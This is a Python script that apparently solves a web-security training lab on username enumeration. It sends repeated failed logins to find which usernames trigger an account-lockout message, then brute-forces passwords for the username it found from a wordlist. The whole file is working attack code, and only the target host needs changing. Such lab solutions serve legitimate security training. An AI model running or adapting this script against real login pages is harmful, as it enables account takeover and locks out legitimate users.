import requests
from bs4 import BeautifulSoup
import time

# Setup
site = '0a2f00b60374105480bb499d009200a7.web-security-academy.net'  # <-- Replace with yours
login_url = f'https://{site}/login'
s = requests.Session()

def try_target(username):
    """Try logging in as a username 6 times with bogus password to trigger lockout message if valid."""
    logindata = {
        'username': username,
        'password': 'foo'
    }
    for i in range(6):
        resp = s.post(login_url, data=logindata)
    return resp.text

def find_valid_username():
    with open('auth-lab-usernames', 'r') as f:
        usernames = [line.strip() for line in f]

    for username in usernames:
        print(f"[*] Testing username: {username}")
        result = try_target(username)
        if "too many incorrect login attempts" in result:
            print(f"[✓] Found valid username: {username}")
            return username

    print("[-] No valid usernames found.")
    return None

def find_password(valid_username):
    with open('auth-lab-passwords', 'r') as f:
        passwords = [line.strip() for line in f]

    print("[*] Waiting 60 seconds for lockout to expire...")
    time.sleep(60)

    for password in passwords:
        logindata = {
            'username': valid_username,
            'password': password
        }
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text, 'html.parser')
        warning = soup.find('p', {'class': 'is-warning'})

        if warning is None:
            print(f"[✓] Password for {valid_username} is: {password}")
            return password

        print(f"[-] Attempt failed: {password}")

    print("[-] Password not found.")
    return None

def main():
    print("[*] Starting username enumeration...")
    valid_user = find_valid_username()

    if valid_user:
        print(f"[*] Found valid user: {valid_user}")
        find_password(valid_user)
    else:
        print("[-] Could not find a valid username.")

if __name__ == "__main__":
    main()
